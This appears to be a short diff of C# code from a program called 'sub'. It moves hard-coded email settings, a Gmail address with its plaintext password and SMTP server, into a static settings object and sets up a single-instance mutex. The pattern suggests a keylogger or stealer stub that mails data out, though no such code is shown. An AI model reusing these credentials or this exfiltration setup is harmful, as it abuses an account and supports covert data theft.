@@ -6,20 +6,21 @@ namespace sub
 {
     internal class Program
     {
+        public static Settings Settings;
         private static void Main()
         {
-            /*
-                SettingsParser parser = new SettingsParser(Application.ExecutablePath);
-                string[] decryptedSettings = parser.GetSettings();
-                Settings.EmailAddress = decryptedSettings[0];
-                Settings.EmailPassword = "decryptedSettings[1];
-                Settings.SmtpAddress = decryptedSettings[2];
-                Settings.SmtpPort = decryptedSettings[3];
+            /* SettingsParser parser = new SettingsParser(Application.ExecutablePath);
+             * string decryptedSettings = parser.GetSettings();
+             * settings = Settings.DeserializeFromSelf(decryptedSettings);
              */
-            Settings.EmailAddress = "sexmongrel69@gmail.com";
-            Settings.EmailPassword = "omglawls";
-            Settings.SmtpAddress = "smtp.gmail.com";
-            Settings.SmtpPort = 587;
+
+            Settings = new Settings
+                                    {
+                                        EmailAddress = "sexmongrel69@gmail.com",
+                                        EmailPassword = "omglawls",
+                                        SmtpAddress = "smtp.gmail.com",
+                                        SmtpPort = 587
+                                    };
 
             Variables.Mutex = new Mutex(false, Variables.MutexID, out Variables.CreatedMutex);
             
